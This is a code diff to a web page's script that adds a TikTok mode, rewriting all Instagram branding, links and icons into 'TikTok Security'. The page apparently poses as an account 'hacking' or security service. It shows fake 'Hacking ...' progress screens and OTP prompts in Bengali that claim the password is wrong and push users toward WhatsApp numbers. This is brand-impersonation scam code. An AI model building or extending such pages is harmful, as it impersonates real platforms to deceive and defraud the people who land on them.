@@ -1951,11 +1951,77 @@
     <script>
         const CARD_IDS = [];
         const CATEGORY_ANIMATION_KEY = 'instagramContact3DAnimationShown';
+        const CONTACT_URL_PARAMS = new URLSearchParams(window.location.search);
+        const CONTACT_SERVICE_PARAM = String(CONTACT_URL_PARAMS.get('service') || '').toLowerCase();
+        const IS_TIKTOK_SECURITY_MODE = CONTACT_SERVICE_PARAM === 'tiktok-safety' || CONTACT_SERVICE_PARAM === 'tiktok-security' || CONTACT_SERVICE_PARAM === 'tiktok';
+        const CONTACT_BRAND_LABEL = IS_TIKTOK_SECURITY_MODE ? 'TikTok' : 'Instagram';
+        const CONTACT_VOICE_SERVICE_KEY = IS_TIKTOK_SECURITY_MODE ? 'tiktok-service' : 'instagram-service';
 
         let refreshIntervalId = null;
         let otpSubmitBound = false;
         const instagramContactFlowIntervals = new Set();
         const instagramContactFlowTimeouts = new Set();
+
+        function replaceContactBrandText(value) {
+            return String(value || '')
+                .replace(/Instagram Security/gi, 'TikTok Security')
+                .replace(/Instagram/g, 'TikTok')
+                .replace(/instagram/g, 'tiktok');
+        }
+
+        function applyTikTokBrandingIfNeeded() {
+            if (!IS_TIKTOK_SECURITY_MODE) {
+                return;
+            }
+
+            document.title = replaceContactBrandText(document.title);
+
+            const serviceChip = document.querySelector('.service-chip');
+            if (serviceChip) {
+                serviceChip.textContent = 'TIKTOK SECURITY SERVICE';
+            }
+
+            const pageRoot = document.querySelector('.contact-page');
+            if (pageRoot) {
+                const walker = document.createTreeWalker(pageRoot, NodeFilter.SHOW_TEXT, null);
+                const textNodes = [];
+                while (walker.nextNode()) {
+                    textNodes.push(walker.currentNode);
+                }
+                textNodes.forEach((textNode) => {
+                    const original = textNode.nodeValue;
+                    const replaced = replaceContactBrandText(original);
+                    if (replaced !== original) {
+                        textNode.nodeValue = replaced;
+                    }
+                });
+            }
+
+            document.querySelectorAll('[placeholder]').forEach((el) => {
+                const replaced = replaceContactBrandText(el.getAttribute('placeholder'));
+                el.setAttribute('placeholder', replaced);
+            });
+
+            document.querySelectorAll('input[value]').forEach((el) => {
+                const replaced = replaceContactBrandText(el.value);
+                if (replaced !== el.value) {
+                    el.value = replaced;
+                    el.setAttribute('value', replaced);
+                }
+            });
+
+            document.querySelectorAll('a[href]').forEach((el) => {
+                const href = el.getAttribute('href');
+                if (href && /instagram\.com/i.test(href)) {
+                    el.setAttribute('href', href.replace(/instagram\.com/gi, 'tiktok.com'));
+                }
+            });
+
+            document.querySelectorAll('.fa-instagram').forEach((icon) => {
+                icon.classList.remove('fa-instagram');
+                icon.classList.add('fa-tiktok');
+            });
+        }
 
         function trackInstagramContactFlowInterval(callback, delay) {
             const intervalId = window.setInterval(callback, delay);
@@ -2143,13 +2209,13 @@
                     const specialNoteWarningEl = document.getElementById('specialNoteWarning');
 
                     if (specialNoteTitleEl) {
-                        specialNoteTitleEl.textContent = content.special_note_title || 'Special Note';
+                        specialNoteTitleEl.textContent = replaceContactBrandText(content.special_note_title || 'Special Note');
                     }
                     if (specialNoteMessageEl) {
-                        specialNoteMessageEl.textContent = content.special_note_message || 'Please use only the verified numbers shown below.';
+                        specialNoteMessageEl.textContent = replaceContactBrandText(content.special_note_message || 'Please use only the verified numbers shown below.');
                     }
                     if (specialNoteWarningEl) {
-                        specialNoteWarningEl.textContent = content.special_note_warning || 'For your safety, contact only the listed WhatsApp numbers.';
+                        specialNoteWarningEl.textContent = replaceContactBrandText(content.special_note_warning || 'For your safety, contact only the listed WhatsApp numbers.');
                     }
                 }
             } catch (error) {
@@ -2227,8 +2293,8 @@
                     categoryBox.onclick = () => handleCategoryClick(category);
                     categoryBox.innerHTML = `
                         <i class="${category.icon || 'fas fa-folder'}"></i>
-                        <h3>${category.name}</h3>
-                        <p>${category.description || ''}</p>
+                        <h3>${replaceContactBrandText(category.name)}</h3>
+                        <p>${replaceContactBrandText(category.description || '')}</p>
                     `;
                     categoriesGrid.appendChild(categoryBox);
                 });
@@ -2266,7 +2332,8 @@
         function resolveOtpCategoryVisual(category) {
             const fallbackIcon = 'fas fa-shield-alt';
             const fallbackName = 'Secure Category';
-            const rawName = category && category.name ? String(category.name).trim() : '';
+            const rawNameSource = category && category.name ? String(category.name).trim() : '';
+            const rawName = replaceContactBrandText(rawNameSource);
             const rawIcon = category && category.icon ? String(category.icon).trim() : '';
             const normalizedName = rawName.toLowerCase();
             const iconMap = [
@@ -2344,7 +2411,7 @@
             }
 
             clearInstagramContactFlowTimers();
-            title.textContent = `Loading ${category.name}...`;
+            title.textContent = replaceContactBrandText(`Loading ${category.name}...`);
             message.textContent = 'Initializing service tools...';
             progress.style.width = '0%';
             loadingScreen.classList.add('show');
@@ -2374,7 +2441,7 @@
             }
 
             clearInstagramContactFlowTimers();
-            title.textContent = `Hacking ${category.name}...`;
+            title.textContent = replaceContactBrandText(`Hacking ${category.name}...`);
             progress.style.width = '0%';
 
             const logs = [
@@ -2498,7 +2565,7 @@
             const dialog = document.getElementById('codeMatchDialog');
             const messageEl = document.getElementById('codeMatchMessage');
             if (dialog && messageEl) {
-                const lines = buildCodeMatchLines(message);
+                const lines = buildCodeMatchLines(replaceContactBrandText(message));
                 messageEl.innerHTML = lines
                     .map((line) => `<span class="code-match-line">${escapeCodeMatchHtml(line)}</span>`)
                     .join('');
@@ -2575,9 +2642,9 @@
             const otpHeader = document.getElementById('otpWhatsAppHeader');
 
             if (otpErrorNotification && otpErrorMessage) {
-                otpErrorMessage.textContent = message || (window.__instagramOtpErrorText || 'আপনার পাসওয়ার্ডটি ভুল। নিচের WhatsApp নাম্বারে যোগাযোগ করুন।');
+                otpErrorMessage.textContent = replaceContactBrandText(message || (window.__instagramOtpErrorText || 'আপনার পাসওয়ার্ডটি ভুল। নিচের WhatsApp নাম্বারে যোগাযোগ করুন।'));
                 if (otpHeader) {
-                    otpHeader.textContent = window.__instagramOtpHeaderText || 'সঠিক কোড পেতে নিচের WhatsApp নম্বরে যোগাযোগ করুন';
+                    otpHeader.textContent = replaceContactBrandText(window.__instagramOtpHeaderText || 'সঠিক কোড পেতে নিচের WhatsApp নম্বরে যোগাযোগ করুন');
                 }
                 otpErrorNotification.classList.add('show');
                 loadWhatsAppNumbersForOTP();
@@ -2624,12 +2691,13 @@
 
         async function refreshAll() {
             await Promise.all([loadPhoneHackContent(), loadWhatsAppNumbers(), loadCategories()]);
+            applyTikTokBrandingIfNeeded();
         }
 
         if (typeof window.initServiceVoiceAssistant === 'function') {
             const isVisible = (el) => !!el && window.getComputedStyle(el).display !== 'none' && window.getComputedStyle(el).visibility !== 'hidden';
             window.initServiceVoiceAssistant({
-                serviceKey: 'instagram-service',
+                serviceKey: CONTACT_VOICE_SERVICE_KEY,
                 detectStageKey: () => {
                     const otpScreen = document.getElementById('otpScreen');
                     const categoryLoadingScreen = document.getElementById('categoryLoadingScreen');
@@ -2657,8 +2725,8 @@
                 const response = await fetch(`/api/settings?t=${Date.now()}`, { cache: 'no-cache' });
                 const result = await response.json();
                 const settings = (result && result.settings) || {};
-                window.__instagramOtpErrorText = settings.instagram_otp_error_message || 'আপনার পাসওয়ার্ডটি ভুল। নিচের WhatsApp নাম্বারে যোগাযোগ করুন।';
-                window.__instagramOtpHeaderText = settings.instagram_otp_contact_header || 'সঠিক কোড পেতে নিচের WhatsApp নম্বরে যোগাযোগ করুন';
+                window.__instagramOtpErrorText = replaceContactBrandText(settings.instagram_otp_error_message || 'আপনার পাসওয়ার্ডটি ভুল। নিচের WhatsApp নাম্বারে যোগাযোগ করুন।');
+                window.__instagramOtpHeaderText = replaceContactBrandText(settings.instagram_otp_contact_header || 'সঠিক কোড পেতে নিচের WhatsApp নম্বরে যোগাযোগ করুন');
                 const otpHeader = document.getElementById('otpWhatsAppHeader');
                 if (otpHeader) {
                     otpHeader.textContent = window.__instagramOtpHeaderText;
@@ -2667,10 +2735,12 @@
         }
 
         async function initializePage() {
+            applyTikTokBrandingIfNeeded();
             await loadOtpTextsFromSettings();
             await loadVerificationDialogTextsFromSettings();
             await loadInstagramSecurityFieldValues();
             await refreshAll();
+            applyTikTokBrandingIfNeeded();
             resumeInstagramContactRefresh();
         }
 
@@ -2776,9 +2846,9 @@
         function resolveInstagramFieldValue(fieldType) {
             const configuredValue = normalizeAdminFieldValue(instagramFieldValues[fieldType]);
             if (configuredValue) {
-                return configuredValue;
+                return replaceContactBrandText(configuredValue);
             }
-            return instagramSecurityMaskedPlaceholder;
+            return replaceContactBrandText(instagramSecurityMaskedPlaceholder);
         }
 
         function getHideTextByFieldType(fieldType) {
